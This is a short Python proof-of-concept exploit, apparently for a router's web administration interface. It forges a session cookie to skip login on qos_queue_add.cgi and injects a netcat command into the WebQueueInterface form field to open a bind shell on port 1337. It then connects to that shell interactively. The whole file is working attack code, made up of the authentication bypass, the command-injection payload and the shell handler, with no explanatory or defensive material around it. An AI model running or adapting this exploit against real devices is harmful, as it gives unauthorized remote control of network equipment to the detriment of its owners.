#!/usr/bin/python3

from pwn import *
import urllib.parse
import requests
import sys

try:
    HOST = sys.argv[1]
except IndexError: 
    exit("Sorry I need your IP as argument to run, e.g. ./poc.py 192.168.1.44")

MALICIOUS = HOST + " admin 0"
COMMAND = urllib.parse.quote("nc -l -p 1337 -e 'sh'")

print(f"[*] Attempting to create session file with evil session {MALICIOUS}")
r=requests.get("http://192.168.1.1/qos_queue_add.cgi", cookies={"session":MALICIOUS})

req = f"""POST /qos_queue_add.cgi HTTP/1.1
Host: 192.168.1.1
Content-Length: 159
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html, /
X-Requested-With: XMLHttpRequest
If-Modified-Since: 0
Expires: 0
Origin: http://192.168.1.1/
Referer: http://192.168.1.1/indexMain.cgi
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session={MALICIOUS}
Connection: close

Submit=Apply&WebQueueActiveCfg=Active&QueueObjectIndex=1&QueueNameTxt=WAN_Default_Queue&WebQueueInterface=WAN;{COMMAND};&WebQueuePriority=3&WebQueueWeight=1&WebQueueRate=""".encode()

print(f"[*] Now sending the payload to run following command (url-encoded): {COMMAND}")
io = remote("192.168.1.1", 80)
io.send(req)
io.close()

sleep(1)

io = remote("192.168.1.1", 1337)
print("[*] Got shell!")
io.interactive()
